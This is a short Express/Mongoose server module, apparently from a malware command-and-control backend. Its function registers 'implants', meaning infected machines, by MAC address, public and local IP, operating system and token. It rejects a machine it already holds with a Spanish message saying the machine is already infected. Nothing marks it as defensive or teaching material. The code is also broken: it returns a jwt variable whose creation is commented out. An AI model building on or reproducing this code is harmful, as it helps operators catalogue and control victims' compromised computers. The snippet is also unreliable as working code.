import { response } from 'express'
import {new_jwt, new_jwt_implant} from './jwt.mjs';
import Implant from '../models/Implant_model.mjs';


const create_implant = async( body ) => {
    
    const { 
        impl_mac,
        impl_number,
        group,
        public_ip,
        local_ip,
        operating_system,
        token,
        impl_id
    } = body;

    let implan_by_model = await Implant.findOne({ impl_mac });

    let errors=[];

    if( implan_by_model ){
        errors.push("El equipo ya esta infectado");
        console.log("El equipo ya esta infectado");
    }
        

    if(errors.length > 0) return { errors };

    const implant = new Implant({ ...body });                                          //Create model
    await implant.save();                                                               // <--- Save user in database
    //const jwt = await new_jwt_implant();

    return {errors, jwt};
        
}


export { create_implant }